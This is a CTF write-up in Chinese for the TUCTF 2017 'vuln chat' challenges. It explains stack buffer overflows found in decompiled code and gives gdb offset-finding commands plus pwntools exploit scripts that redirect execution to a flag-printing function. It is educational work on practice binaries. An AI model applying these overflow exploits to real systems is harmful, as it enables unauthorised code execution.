# TUCTF 2017 - Notes

## Vuln Chat

保護只有開 DEP ，先用 ida pro 看一下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char msg[20]; // [sp+3h] [bp-2Dh]@1
  char username[20]; // [sp+17h] [bp-19h]@1
  int format; // [sp+2Bh] [bp-5h]@1
  char v7; // [sp+2Fh] [bp-1h]@1

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  format = 's03%';
  v7 = 0;
  __isoc99_scanf(&format, username);
  printf("Welcome %s!\n", username);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", username);
  __isoc99_scanf(&format, msg);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```

可以看到有兩次 scanf("%30s")

然後有一個 function 是 printFlag() ，他可以 cat flag.txt

所以思路就是可以 overflow 後跳 printFlag() ，但 scanf("%30s") 不夠蓋到 eip

所以要先改 scanf 的 format  

先用 gdb break 在第一個 scanf() 上面看位址，然後輸入很大的字
```
Guessed arguments:
arg[0]: 0xffffd563 ("%30s")
arg[1]: 0xffffd54f --> 0xfb53dcf7 
```

可以知道在20 - 24 可以蓋到 format

所以流程是，第一次 scanf() 蓋好 format 的值，第二次時 overflow 跳函數

可以先用 gdb 試試看有沒蓋到 format 
```
gdb-peda$ r <<< $(python -c 'print "a"*20 + "%s\n" + "aaaa"')
```

之後看要多少可以蓋到 eip
```
gdb-peda$ r <<< $(python -c 'from pwn import * ; print "a"*20 + "%s\n" + cyclic(100)')
```

可以知道 49-53 可以蓋到 eip

payload:
```
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
r = remote('127.0.0.1',1234)
target = 0x0804856b
payload = 'a'*20 + "%s"
r.sendlineafter('username: ',payload)
payload2 = 'a'*49 + p32(target)
r.sendlineafter(': ',payload2)
r.interactive()
```

## vuln chat 2.0

保護只有開 DEP 的 x86 程式，且一樣有一個 function 是 printFlag() 可以 cat flag.txt

然後用 ida pro 看一下 doThings()
```c
int doThings()
{
  char buf[20]; // [sp+1h] [bp-27h]@1
  char name[15]; // [sp+15h] [bp-13h]@1

  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf("%15s", name);
  printf("Welcome %s!\n", name);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: You've proven yourself to me. What information do you need?");
  printf("%s: ", name);
  read(0, buf, 45u);
  puts("djinn: Alright here's you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  return puts("djinn: Wait thats not right...");
}
```

第一次輸入 name 那邊沒啥意義，第二次輸入buf 的長度最長是 45，而 buf 長度是 39

剛好可以蓋到 eip 最低 1 bytes ，然後看一下 printFlag 和 eip 的地址
```
0x08048672  printFlag
0x0804863c  ret
```

可以看到只差最後一個 bytes ，所以 payload:
```python
#!/usr/bin/env python
from pwn import * 
r = remote('127.0.0.1',1234)

flag = '\x72'
r.sendlineafter('username: ', 'aaaa')
payload = "a"*43 + flag
r.sendafter('aaaa: ', payload)
r.interactive()
```

## guestbook

保護開了 NX 和 PIE 的 x86 程式